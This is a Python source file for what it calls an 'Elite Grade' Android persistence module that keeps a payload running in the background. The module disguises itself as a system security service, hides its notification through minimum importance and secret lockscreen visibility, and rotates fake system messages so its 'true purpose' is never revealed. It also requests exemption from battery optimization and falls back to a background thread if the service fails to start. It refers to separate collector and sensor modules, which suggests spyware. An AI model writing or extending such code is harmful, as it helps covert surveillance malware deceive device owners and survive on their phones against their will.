#!/usr/bin/env python3
"""
Foreground Service Persistence Module v2.1.0 — Elite Grade
Android Foreground Service that keeps the payload alive and prioritized.
Key design decisions:
- Low-priority silent notification channel (foreground service req)
- Automatic restart on crash (START_STICKY)
- Notification content never reveals true purpose
- Battery optimization whitelist request (Android 6+)
- Doze mode exemption via PowerManager
- Configurable notification text (morphs to system-looking messages)
- Graceful degradation: falls back to background thread if service fails
- Full isolation: crash here never affects collector/sensor modules
"""
import logging
import json
import os
import sys
import threading
import time
import random
from typing import Dict, Optional, Any
from datetime import datetime, timezone
from enum import Enum

log = logging.getLogger("ForegroundService")
log.setLevel(logging.DEBUG)

# ──────────────────────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────────────────────
SERVICE_CLASS_NAME = "com.android.system.security.SystemSecurityService"
NOTIFICATION_CHANNEL_ID = "system_security_channel"
NOTIFICATION_CHANNEL_NAME = "System Security"
NOTIFICATION_ID = 0x7A3B  # Semi-random but consistent

# Morphing notification titles that look harmless
NOTIFICATION_TITLES = [
    "System update available",
    "Security scan complete",
    "Network optimization active",
    "Battery optimization running",
    "Background sync active",
    "System maintenance in progress",
    "App optimization complete",
]

NOTIFICATION_BODIES = [
    "Tap to review system settings",
    "No action required",
    "Running in background",
    "System services active",
    "Tap for details",
    "Device optimization active",
]

# Android API levels
ANDROID_O = 26   # Notification channels required
ANDROID_S = 31   # Notification permission required
ANDROID_T = 33   # POST_NOTIFICATIONS permission
ANDROID_U = 34   # Foreground service types required

FOREGROUND_SERVICE_TYPES = ["specialUse", "dataSync"]


class ServiceState(Enum):
    STOPPED = "stopped"
    STARTING = "starting"
    RUNNING = "running"
    STOPPING = "stopping"
    CRASHED = "crashed"
    FALLBACK = "fallback"


class ForegroundServiceEngine:
    """
    Manages the Android Foreground Service lifecycle.
    All operations are thread-safe and fully isolated.
    """

    def __init__(self, config: Dict[str, Any], event_bus: Optional[Any] = None):
        self._config = config
        self._event_bus = event_bus
        self._lock = threading.RLock()
        self._state = ServiceState.STOPPED
        self._thread: Optional[threading.Thread] = None
        self._service_start_time: Optional[float] = None
        self._notification_title_index = 0
        self._notification_body_index = 0
        self._morph_interval = 300  # seconds — change notification text
        self._last_morph_time: float = 0.0
        self._state_file = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            ".foreground_service_state.json"
        )
        self._stats = {
            "start_attempts": 0,
            "start_success": 0,
            "start_failures": 0,
            "restarts": 0,
            "crashes": 0,
            "notification_updates": 0,
            "battery_opt_requested": False,
            "last_start_time": None,
            "last_error": None,
            "state": "stopped",
        }

    # ──────────────────────────────────────────────────────────────────────────
    # Public API
    # ──────────────────────────────────────────────────────────────────────────

    def start(self) -> bool:
        """Start the foreground service."""
        with self._lock:
            if self._state == ServiceState.RUNNING:
                log.debug("Foreground service already running")
                return True

            self._state = ServiceState.STARTING
            self._stats["start_attempts"] += 1
            log.info("Foreground service engine starting")

            # Load persisted state
            self._load_state()

            # Create notification channel (Android 8+)
            if not self._create_notification_channel():
                log.warning("Failed to create notification channel")
                # Non-fatal — service can still run

            # Request notification permission (Android 13+)
            if not self._request_notification_permission():
                log.warning("Failed to request notification permission")
                # Non-fatal

            # Request battery optimization whitelist
            if not self._request_battery_optimization_whitelist():
                log.warning("Failed to request battery optimization whitelist")
                # Non-fatal

            # Start the actual Android Foreground Service
            if self._start_android_service():
                self._state = ServiceState.RUNNING
                self._service_start_time = time.time()
                self._stats["start_success"] += 1
                self._stats["last_start_time"] = datetime.now(timezone.utc).isoformat()
                self._stats["state"] = "running"
                self._save_state()
                log.info("Foreground service started successfully")
                return True
            else:
                # Start fallback background thread
                log.warning("Android service start failed, using fallback thread")
                return self._start_fallback_thread()

    def stop(self) -> bool:
        """Stop the foreground service."""
        with self._lock:
            if self._state == ServiceState.STOPPED:
                return True

            self._state = ServiceState.STOPPING
            log.info("Foreground service engine stopping")

            # Stop Android service
            try:
                self._stop_android_service()
            except Exception as e:
                log.warning(f"Error stopping Android service: {e}")

            # Stop fallback thread
            if self._thread and self._thread.is_alive():
                self._thread = None

            self._state = ServiceState.STOPPED
            self._stats["state"] = "stopped"
            self._save_state()
            log.info("Foreground service engine stopped")
            return True

    def update_notification(self, title: Optional[str] = None, body: Optional[str] = None) -> bool:
        """Update the foreground notification text."""
        with self._lock:
            if self._state != ServiceState.RUNNING:
                return False

            try:
                if title:
                    notif_title = title
                else:
                    # Cycle through titles to appear dynamic
                    self._notification_title_index = (self._notification_title_index + 1) % len(NOTIFICATION_TITLES)
                    notif_title = NOTIFICATION_TITLES[self._notification_title_index]

                if body:
                    notif_body = body
                else:
                    self._notification_body_index = (self._notification_body_index + 1) % len(NOTIFICATION_BODIES)
                    notif_body = NOTIFICATION_BODIES[self._notification_body_index]

                # Update via JNI
                self._update_service_notification(notif_title, notif_body)
                self._stats["notification_updates"] += 1
                self._last_morph_time = time.time()
                return True

            except Exception as e:
                log.warning(f"Failed to update notification: {e}")
                return False

    def is_running(self) -> bool:
        """Check if the service is currently running."""
        with self._lock:
            return self._state in (ServiceState.RUNNING, ServiceState.FALLBACK)

    def get_state(self) -> ServiceState:
        """Get current service state."""
        with self._lock:
            return self._state

    def get_stats(self) -> Dict[str, Any]:
        """Get current service statistics."""
        with self._lock:
            return dict(self._stats)

    def get_uptime(self) -> float:
        """Get service uptime in seconds."""
        with self._lock:
            if self._service_start_time:
                return time.time() - self._service_start_time
            return 0.0

    # ──────────────────────────────────────────────────────────────────────────
    # Internal Implementation
    # ──────────────────────────────────────────────────────────────────────────

    def _create_notification_channel(self) -> bool:
        """Create a silent notification channel (Android 8+ requirement)."""
        try:
            from android import native_bridge  # type: ignore

            # Check Android version
            if not hasattr(native_bridge, 'build') or native_bridge.build.VERSION.SDK_INT < ANDROID_O:
                return True  # Pre-Oreo, no channel needed

            context = native_bridge.get_application_context()
            if context is None:
                return False

            # Create notification channel via JNI
            notification_manager = context.getSystemService("notification")
            if notification_manager is None:
                return False

            channel = native_bridge.new_object(
                "android/app/NotificationChannel",
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                1  # IMPORTANCE_MIN — silent, no sound/vibration
            )
            channel.setDescription("System security service notifications")
            channel.setShowBadge(False)
            channel.setLockscreenVisibility(0)  # VISIBILITY_SECRET
            channel.enableVibration(False)
            channel.setSound(None, None)

            notification_manager.createNotificationChannel(channel)
            log.info("Silent notification channel created")
            return True

        except ImportError:
            log.info("Native bridge not available, skipping channel creation")
            return True  # Non-critical

        except Exception as e:
            log.warning(f"Failed to create notification channel: {e}")
            return False

    def _request_notification_permission(self) -> bool:
        """Request POST_NOTIFICATIONS permission on Android 13+."""
        try:
            from android import native_bridge  # type: ignore

            if native_bridge.build.VERSION.SDK_INT < ANDROID_T:
                return True  # Permission not required pre-13

            context = native_bridge.get_application_context()
            if context is None:
                return False

            # Check if permission already granted
            permission = "android.permission.POST_NOTIFICATIONS"
            result = context.checkSelfPermission(permission)
            if result == 0:  # PERMISSION_GRANTED
                return True

            # Request permission
            activity = native_bridge.get_current_activity()
            if activity is None:
                # Request via service context (may show system dialog)
                native_bridge.request_permission(permission)
            else:
                activity.requestPermissions([permission], 0x1001)

            log.info("Notification permission requested")
            return True

        except ImportError:
            return True  # Non-critical

        except Exception as e:
            log.warning(f"Failed to request notification permission: {e}")
            return False

    def _request_battery_optimization_whitelist(self) -> bool:
        """Request exemption from battery optimization (Android 6+)."""
        try:
            from android import native_bridge  # type: ignore

            if native_bridge.build.VERSION.SDK_INT < 23:  # Android 6.0
                return True

            context = native_bridge.get_application_context()
            if context is None:
                return False

            power_manager = context.getSystemService("power")
            if power_manager is None:
                return False

            # Check if already whitelisted
            package_name = context.getPackageName()
            if power_manager.isIgnoringBatteryOptimizations(package_name):
                log.info("Already whitelisted from battery optimization")
                self._stats["battery_opt_requested"] = True
                return True

            # Request whitelist via intent
            intent = native_bridge.new_object("android/content/Intent")
            intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS")
            intent.setData(f"package:{package_name}")

            activity = native_bridge.get_current_activity()
            if activity:
                activity.startActivity(intent)
                log.info("Battery optimization whitelist requested")
                self._stats["battery_opt_requested"] = True
                return True

            return False

        except ImportError:
            return True  # Non-critical

        except Exception as e:
            log.warning(f"Failed to request battery optimization whitelist: {e}")
            return False

    def _start_android_service(self) -> bool:
        """Start the actual Android Foreground Service via JNI."""
        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                log.warning("No application context available")
                return False

            # Build intent
            intent = native_bridge.new_object("android/content/Intent")
            intent.setClassName(
                context.getPackageName(),
                SERVICE_CLASS_NAME
            )

            # Start foreground service
            # On Android 8+, use startForegroundService() which requires
            # service to show notification within 5 seconds
            if native_bridge.build.VERSION.SDK_INT >= ANDROID_O:
                context.startForegroundService(intent)
            else:
                context.startService(intent)

            log.info("Android foreground service start intent sent")
            return True

        except ImportError:
            log.warning("Native bridge not available, cannot start Android service")
            return False

        except Exception as e:
            log.error(f"Failed to start Android service: {e}")
            return False

    def _stop_android_service(self) -> bool:
        """Stop the Android Foreground Service."""
        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                return False

            intent = native_bridge.new_object("android/content/Intent")
            intent.setClassName(
                context.getPackageName(),
                SERVICE_CLASS_NAME
            )
            context.stopService(intent)
            log.info("Android foreground service stop intent sent")
            return True

        except Exception as e:
            log.warning(f"Failed to stop Android service: {e}")
            return False

    def _update_service_notification(self, title: str, body: str) -> bool:
        """Update the foreground service notification via JNI."""
        try:
            from android import native_bridge  # type: ignore

            context = native_bridge.get_application_context()
            if context is None:
                return False

            # Build notification
            builder = native_bridge.new_object("android/app/Notification$Builder")
            builder.setContentTitle(title)
            builder.setContentText(body)
            builder.setSmallIcon(0x7F010001)  # Default icon reference
            builder.setOngoing(True)
            builder.setPriority(-2)  # PRIORITY_MIN
            builder.setCategory("SERVICE")

            # Set channel for Android 8+
            if native_bridge.build.VERSION.SDK_INT >= ANDROID_O:
                builder.setChannelId(NOTIFICATION_CHANNEL_ID)

            # Build notification
            notification = builder.build()

            # Update via NotificationManager
            notification_manager = context.getSystemService("notification")
            if notification_manager:
                notification_manager.notify(NOTIFICATION_ID, notification)
                log.debug(f"Notification updated: {title} — {body}")
                return True

            return False

        except Exception as e:
            log.warning(f"Failed to update notification: {e}")
            return False

    def _start_fallback_thread(self) -> bool:
        """Start a background thread as fallback if Android service fails."""
        try:
            self._state = ServiceState.FALLBACK
            self._service_start_time = time.time()
            self._stats["start_success"] += 1
            self._stats["state"] = "fallback"

            # Background thread just keeps the process alive
            # and periodically morphs notification
            def _fallback_loop():
                self._stats["notification_updates"] += 1
                while self._state == ServiceState.FALLBACK:
                    try:
                        # Morph notification periodically
                        if time.time() - self._last_morph_time > self._morph_interval:
                            self.update_notification()
                            self._last_morph_time = time.time()
                        time.sleep(30)
                    except Exception:
                        break

            self._thread = threading.Thread(
                target=_fallback_loop,
                daemon=True,
                name="ForegroundService-Fallback"
            )
            self._thread.start()
            log.info("Fallback foreground thread started")
            self._save_state()
            return True

        except Exception as e:
            log.error(f"Failed to start fallback thread: {e}")
            return False

    # ──────────────────────────────────────────────────────────────────────────
    # State Persistence
    # ──────────────────────────────────────────────────────────────────────────

    def _save_state(self):
        """Persist service state to disk."""
        try:
            state = {
                "stats": self._stats,
                "service_start_time": self._service_start_time,
                "state": self._state.value,
                "notification_title_index": self._notification_title_index,
                "notification_body_index": self._notification_body_index,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
            with open(self._state_file, "w") as f:
                json.dump(state, f, indent=2)
        except Exception as e:
            log.warning(f"Failed to save foreground service state: {e}")

    def _load_state(self):
        """Load persisted service state."""
        try:
            if os.path.exists(self._state_file):
                with open(self._state_file, "r") as f:
                    state = json.load(f)
                self._stats = state.get("stats", self._stats)
                self._service_start_time = state.get("service_start_time")
                self._notification_title_index = state.get("notification_title_index", 0)
                self._notification_body_index = state.get("notification_body_index", 0)
                log.info("Foreground service state loaded")
        except Exception as e:
            log.warning(f"Failed to load foreground service state: {e}")

    def reset_state(self):
        """Reset all state for clean start."""
        with self._lock:
            self._state = ServiceState.STOPPED
            self._service_start_time = None
            self._notification_title_index = 0
            self._notification_body_index = 0
            self._last_morph_time = 0.0
            self._stats = {
                "start_attempts": 0,
                "start_success": 0,
                "start_failures": 0,
                "restarts": 0,
                "crashes": 0,
                "notification_updates": 0,
                "battery_opt_requested": False,
                "last_start_time": None,
                "last_error": None,
                "state": "stopped",
            }
            self._save_state()
        log.info("Foreground service state reset")


# ──────────────────────────────────────────────────────────────────────────────
# Module Interface
# ──────────────────────────────────────────────────────────────────────────────

_engine: Optional[ForegroundServiceEngine] = None


def initialize(config: Dict[str, Any], event_bus: Optional[Any] = None) -> bool:
    """Initialize the foreground service module."""
    global _engine
    try:
        _engine = ForegroundServiceEngine(config, event_bus)
        return _engine.start()
    except Exception as e:
        log.error(f"Failed to initialize foreground service: {e}")
        return False


def shutdown() -> bool:
    """Shutdown the foreground service module."""
    global _engine
    try:
        if _engine:
            _engine.stop()
            _engine = None
        return True
    except Exception as e:
        log.error(f"Failed to shutdown foreground service: {e}")
        return False


def update_notification(title: Optional[str] = None, body: Optional[str] = None) -> bool:
    """Update the foreground service notification."""
    global _engine
    try:
        if _engine:
            return _engine.update_notification(title, body)
        return False
    except Exception as e:
        log.error(f"Failed to update notification: {e}")
        return False


def is_running() -> bool:
    """Check if foreground service is running."""
    global _engine
    if _engine:
        return _engine.is_running()
    return False


def get_stats() -> Dict[str, Any]:
    """Get current foreground service statistics."""
    global _engine
    if _engine:
        return _engine.get_stats()
    return {"error": "not_initialized"}


def reset() -> bool:
    """Reset foreground service state."""
    global _engine
    try:
        if _engine:
            _engine.reset_state()
        return True
    except Exception as e:
        log.error(f"Failed to reset foreground service: {e}")
        return False
